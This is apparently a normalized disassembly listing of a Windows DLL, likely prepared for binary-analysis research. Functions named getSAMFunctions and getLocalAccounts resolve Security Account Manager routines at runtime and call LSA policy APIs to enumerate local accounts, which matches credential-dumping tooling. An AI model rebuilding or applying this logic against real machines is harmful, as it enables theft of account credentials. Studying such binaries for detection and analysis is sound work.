mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
mov [ ebp - 0x18 ] edx
call sub_10005590
add esp 0x8
mov [ esi + 0x10 ] eax
call sub_10015e4c
lea ecx [ ebp - 0x1c ]
push ecx
push r--data
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
call sub_10005590
add esp 0x8
mov [ esi + 0x14 ] eax
call sub_10015e4c
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
mov edx [ edi ]
mov [ ebp - 0x28 ] eax
mov al [ edx ]
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_10016639
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] dx
call sub_10015e4c
mov [ ebp - 0x28 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x24 ] edx
mov cl [ eax ]
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp + 0x8 ] cl
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_10016639
mov ax [ ebp - 0x18 ]
mov [ esi + 0xe ] ax
mov al 0x1
add esp 0x14
cmp al bl
je r-xdata
mov dl [ edi ]
dec [ ebp - 0x18 ]
mov [ ecx ] dl
inc ecx
inc edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_10015e4c
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x28 ] eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp + 0x8 ] 0x2e
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
call sub_10016639
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] dx
call sub_10015e4c
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x2c ] edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp + 0x8 ] 0x2c
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10016639
mov cx [ ebp - 0x20 ]
add esp 0x14
mov [ esi + 0xe ] cx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
sub_10008270
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
pop ecx
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_100082d0
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push esi
push edi
mov edi [ GetModuleHandleW@IAT ]
push r--data
call edi
push r--data
mov esi eax
call edi
mov ebx eax
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push esi
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push r--data
push ebx
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
retn
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
retn
getSAMFunctions
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_1000d200
call sub_100082d0
test al al
mov eax r--data
jne r-xdata
push eax
push ecx
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0x8 ]
call sub_10001850
mov edx [ esp + 0x2c ]
mov bl al
mov eax [ edx + 0x4 ]
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov [ esp + eax + 0x10 ] r--data
call sub_10003fa0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x60 ]
mov [ esp + edx + 0x10 ] r--data
push eax
mov [ esp + 0x64 ] r--data
call sub_10015fc5
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_10008a40
push ebp
mov ebp esp
push 0xffffffff
push sub_100288eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea esi [ ecx + 0x50 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] esi
mov [ ecx + esi - 0x50 ] r--data
lea ecx [ esi - 0x4c ]
mov [ ebp - 0x4 ] 0x0
call sub_10003fa0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ esi - 0x50 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x50 ] r--data
push esi
mov [ esi ] r--data
call sub_10015fc5
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
getLocalAccounts
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x374
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x370 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esp + 0x14 ] edi
call sub_100082d0
test al al
je r-xdata
push esi
push edi
call getSAMFunctions
mov ecx [ esp + 0x384 ]
add esp 0x8
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edi 0x12
mov [ esp + 0x13 ] 0x1
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x38 ] edi
cmp eax [ esi + 0x4 ]
je r-xdata
xor eax eax
xor ebx ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x34 ]
push eax
push 0xf0fff
lea ecx [ esp + 0x58 ]
push ecx
push ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x30 ] ebx
call [ LsaOpenPolicy@IAT ]
test eax eax
js r-xdata
mov ebx 0x8
cmp [ eax + 0x14 ] ebx
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0x2d
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx [ esp + 0x30 ]
call sub_10001850
add esp 0x1c
mov [ esp + 0x13 ] al
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x370 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x34 ]
lea edx [ esp + 0x24 ]
push edx
push 0x5
push eax
call [ LsaQueryInformationPolicy@IAT ]
test eax eax
js r-xdata
push r--data
push eax
call sub_10017870
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0x43
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx [ esp + 0x30 ]
call sub_10001850
mov [ esp + 0x2f ] al
mov eax [ esp + 0x50 ]
add esp 0x1c
push eax
call [ LsaClose@IAT ]
mov al [ esp + 0x13 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x370 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
lea ecx [ esp + 0x38 ]
push ecx
push ebx
call [ rw-data ]
test eax eax
js r-xdata
mov [ esp + 0x3c ] 0x1
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
cmp [ eax + 0x14 ] ebx
jb r-xdata
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x38 ] esp
mov [ ecx ] ax
push 0x3c
mov eax r--data
call sub_10001f10
mov ecx [ esp + 0x30 ]
call sub_10001850
mov ecx [ esp + 0x40 ]
add esp 0x1c
push ecx
mov [ esp + 0x17 ] al
call [ LsaFreeMemory@IAT ]
mov eax [ esp + 0x34 ]
push eax
call [ LsaClose@IAT ]
mov al [ esp + 0x13 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x370 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x24 ]
mov ecx [ eax + 0x8 ]
lea edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x34 ]
push ecx
push 0xf07ff
push edx
call [ rw-data ]
test eax eax
js r-xdata
push r--data
push eax
call sub_10017870
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax ]
push r--data
push eax
call sub_10017870
add esp 0x8
test eax eax
jne r-xdata
mov eax [ eax ]
sub esp 0x1c
mov eax r--data
mov esi esp
mov [ esp + 0x38 ] esp
call sub_10001ab0
mov ecx [ esp + 0x30 ]
call sub_10001850
add esp 0x1c
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x17 ] al
call [ rw-data ]
mov ecx [ esp + 0x24 ]
push ecx
call [ LsaFreeMemory@IAT ]
mov eax [ esp + 0x34 ]
push eax
call [ LsaClose@IAT ]
mov al [ esp + 0x13 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x370 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x24 ]
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
shr ecx 0x1
push eax
lea esi [ esp + 0x88 ]
call sub_10006590
mov [ esp + 0x38 ] 0x15
mov edi [ esp + 0x38 ]
mov eax [ esi + 0x4 ]
add eax 0xffffffe4
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov eax [ esi ]
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x44 ] ebx
cmp [ eax ] ebx
jbe r-xdata
cmp esi 0x105
je r-xdata
push r--data
push eax
call sub_10017870
add esp 0x8
test eax eax
jne r-xdata
mov eax [ eax ]
push eax
call [ rw-data ]
cmp [ esp + 0x13 ] 0x0
je r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x5c ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0x2e
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx [ esp + 0x30 ]
call sub_10001850
add esp 0x1c
mov [ esp + 0x13 ] al
jmp r-xdata
lea edx [ esp + 0x28 ]
push edx
call [ rw-data ]
cmp [ esp + 0x98 ] 0x8
jb r-xdata
cmp [ esp + 0x13 ] 0x0
jne r-xdata
mov esi [ esp + 0x40 ]
xor ebx ebx
mov eax [ eax + 0x4 ]
movzx ecx [ eax + ebx + 0x4 ]
mov eax [ eax + ebx + 0x8 ]
shr ecx 0x1
xor edx edx
push ecx
xor esi esi
lea ecx [ esp + 0x6c ]
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x7c ] esi
mov [ esp + 0x6c ] dx
call sub_10001f10
mov ecx [ esp + 0x18 ]
mov [ esp + 0x20 ] esi
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push eax
mov eax [ edx + ebx ]
push eax
push 0xf07ff
push ecx
call [ rw-data ]
test eax eax
js r-xdata
cmp esi 0x105
jne r-xdata
lea edx [ esp + 0x30 ]
xor ecx ecx
push edx
mov [ esp + 0x9c ] 0x7
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] cx
call [ rw-data ]
mov ecx [ esp + 0x24 ]
push ecx
call [ LsaFreeMemory@IAT ]
mov eax [ esp + 0x34 ]
push eax
call [ LsaClose@IAT ]
mov al [ esp + 0x13 ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x370 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x84 ]
push eax
call sub_100173b1
add esp 0x4
lea ecx [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x2c ]
push 0x3e8
lea edx [ esp + 0x20 ]
push edx
push ebx
lea eax [ esp + 0x58 ]
push eax
push ecx
call [ rw-data ]
mov esi eax
mov [ esp + 0x40 ] esi
cmp esi ebx
jge r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] esi
push 0x28
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx [ esp + 0x30 ]
call sub_10001850
add esp 0x1c
mov [ esp + 0x13 ] al
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x20 ]
push edx
push edi
push eax
call [ rw-data ]
test eax eax
js r-xdata
mov eax [ esp + 0x18 ]
xor ecx ecx
mov [ esp + 0x68 ] cx
mov ecx [ esp + 0x44 ]
inc ecx
add ebx 0xc
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] esi
mov [ esp + 0x44 ] ecx
cmp ecx [ eax ]
jb r-xdata
mov eax [ esp + 0x68 ]
push eax
call sub_100173b1
add esp 0x4
cmp [ rw-data ] esi
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
mov ecx edi
lea edx [ esp + 0xa4 ]
call sub_1000aaa0
mov edx [ esp + 0x1c ]
mov eax [ edx + 0x4 ]
mov ecx [ ebx + eax ]
mov eax [ esp + 0x28 ]
mov [ esp + 0xa4 ] ecx
movzx edx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x4
shr edx 0x1
push edx
lea ecx [ esp + 0xc4 ]
call sub_10001f10
cmp [ esp + 0xb4 ] esi
jne r-xdata
lea eax [ esp + 0x2c ]
push eax
call [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x3c ]
mov esi [ esp + 0x2c ]
push eax
push edi
sub esp 0x1c
mov edi esp
xor ecx ecx
mov [ esp + 0x40 ] esp
push ecx
lea edx [ esp + 0xac ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_10001db0
sub esp 0x1c
mov edi esp
xor eax eax
mov [ esp + 0x5c ] esp
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
lea ecx [ esp + 0xac ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_10001db0
mov edx [ esp + 0x58 ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + ebx ]
mov edx [ esp + 0x54 ]
push ecx
push edx
mov ecx esi
call sub_1000b950
mov edi [ esp + 0x80 ]
add esp 0x48
mov [ esp + 0x13 ] al
xor esi esi
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
lea edx [ esp + 0xa8 ]
mov ecx edi
call sub_10009570
mov edx [ esp + 0x28 ]
add esp 0x8
push edi
push edx
mov [ esp + 0x1b ] al
call [ rw-data ]
lea esi [ esp + 0xa0 ]
call sub_10009140
xor esi esi
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x4 ]
movzx edx [ eax + ebx + 0x4 ]
mov eax [ eax + ebx + 0x8 ]
shr edx 0x1
push edx
lea ecx [ esp + 0xa8 ]
call sub_10001f10
cmp [ esp + 0x7c ] 0x8
jb r-xdata
sub_10009140
cmp [ esi + 0x2cc ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x2cc ] ebx
mov [ esi + 0x2c8 ] edi
mov [ esi + 0x2b8 ] cx
cmp [ esi + 0x2ac ] 0x8
jb r-xdata
mov eax [ esi + 0x2b8 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x2ac ] ebx
mov [ esi + 0x2a8 ] edi
mov [ esi + 0x298 ] ax
cmp [ esi + 0x28c ] 0x8
jb r-xdata
mov edx [ esi + 0x298 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x28c ] ebx
mov [ esi + 0x288 ] edi
mov [ esi + 0x278 ] dx
cmp [ esi + 0x270 ] 0x8
jb r-xdata
mov ecx [ esi + 0x278 ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0x270 ] ebx
mov [ esi + 0x26c ] edi
mov [ esi + 0x25c ] cx
cmp [ esi + 0x254 ] 0x8
jb r-xdata
mov eax [ esi + 0x25c ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x254 ] ebx
mov [ esi + 0x250 ] edi
mov [ esi + 0x240 ] ax
cmp [ esi + 0x238 ] 0x8
jb r-xdata
mov edx [ esi + 0x240 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x238 ] ebx
mov [ esi + 0x234 ] edi
mov [ esi + 0x224 ] dx
cmp [ esi + 0x218 ] 0x8
jb r-xdata
mov ecx [ esi + 0x224 ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esi + 0x218 ] ebx
mov [ esi + 0x214 ] edi
mov [ esi + 0x204 ] cx
cmp [ esi + 0x1fc ] 0x8
jb r-xdata
mov eax [ esi + 0x204 ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x1fc ] ebx
mov [ esi + 0x1f8 ] edi
mov [ esi + 0x1e8 ] ax
cmp [ esi + 0x1e0 ] 0x8
jb r-xdata
mov edx [ esi + 0x1e8 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ esi + 0x1e0 ] ebx
mov [ esi + 0x1dc ] edi
mov [ esi + 0x1cc ] dx
cmp [ esi + 0x1c4 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1cc ]
push ecx
call sub_100173b1
add esp 0x4
xor ecx ecx
